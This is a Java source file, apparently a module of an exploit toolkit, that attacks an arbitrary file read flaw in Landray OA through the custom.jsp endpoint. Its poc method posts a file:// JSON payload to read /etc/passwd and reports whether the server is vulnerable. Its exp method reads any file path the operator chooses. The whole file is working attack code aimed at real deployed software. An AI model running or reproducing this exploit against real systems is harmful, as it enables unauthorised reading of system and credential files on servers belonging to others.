package cn.exploit;

import cn.utils.HttpUtil;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Landray_OA_custom_read_file extends ExploitFather {

    HttpUtil httpUtil = new HttpUtil();

    @Override
    public String poc(String url) {
        StringBuffer result = new StringBuffer("不存在漏洞");
        httpUtil.url = url+"/sys/ui/extend/varkind/custom.jsp";
        HashMap<String,String> headers = new HashMap<String,String>();
        headers.put("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 Greatwqs");
        headers.put("Content-Type","application/x-www-form-urlencoded");
        headers.put("Accept-Encoding","gzip, deflate");
        httpUtil.headers = headers;
        //设置post数据
        List<NameValuePair> list = new ArrayList<>();
        list.add(new BasicNameValuePair("var",getJson("/etc/passwd")));
        httpUtil.form_data = list;
        String[] resContent = httpUtil.doPost(false);

        if(resContent[0]!=null){
            String status_code = resContent[0];
            String text = resContent[1];
            if(status_code.equals("200") && text.toLowerCase().contains("root")){
                result.setLength(0);
                result.append("存在漏洞\n读取/etc/passwd/:\n");
                result.append(text.trim());
            }
        }

        return result.toString();
    }

    @Override
    public String exp(String url, String payload) {
        StringBuffer result = new StringBuffer("不存在漏洞");
        httpUtil.url = url+"/sys/ui/extend/varkind/custom.jsp";
        HashMap<String,String> headers = new HashMap<String,String>();
        headers.put("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 Greatwqs");
        headers.put("Content-Type","application/x-www-form-urlencoded");
        headers.put("Accept-Encoding","gzip, deflate");
        httpUtil.headers = headers;
        //设置post数据
        List<NameValuePair> list = new ArrayList<>();
        list.add(new BasicNameValuePair("var",getJson(payload)));
        httpUtil.form_data = list;
        String[] resContent = httpUtil.doPost(false);

        if(resContent[0]!=null){
            String status_code = resContent[0];
            String text = resContent[1];
            if(status_code.equals("200")){
                result.setLength(0);
                result.append("\n读取"+payload+":\n");
                result.append(text.trim());
            }
        }

        return result.toString();
    }

    /**
     * 获取payload json数据
     * @return
     */
    public String getJson(String cmd){
        String payload = String.format("file://%s",cmd);
        Map<String, Object> payload_json = new HashMap<>();

        Map<String,Object> map = new HashMap<>();
        map.put("file",payload);
        payload_json.put("body", map);

        Gson gson = new GsonBuilder().disableHtmlEscaping().create();
        String json = gson.toJson(payload_json);
        return json;
    }
}
